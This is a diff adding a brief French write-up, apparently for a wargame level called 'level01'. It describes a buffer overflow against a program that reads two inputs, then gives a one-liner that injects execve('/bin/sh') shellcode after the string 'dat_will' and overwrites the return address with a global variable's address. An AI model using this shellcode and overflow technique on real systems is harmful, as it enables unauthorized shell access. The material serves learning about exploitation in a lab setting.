@@ -1,0 +1,6 @@
+On voit que le programe effectue 2 fgets. Il stock la premiere saisie dans une variable globale, et la seconde dans un buffer.
+Il va compararer les 7 premiers de la variable globale avec "dat_will", puis demander la saisie du mot de passe.
+
+En injectant un shellcode apres "dat_will" et en modifiant l'eip du second fgets par l'adresse de la varibale globale + 7, nous sommes en mesure d'ouvrir un shellcode. 
+
+(python -c 'print "dat_will" + "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x0b\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"'; python -c 'print "A" * 80 + "\x08\x04\xa0\x48"[::-1]'; cat) | ./level01
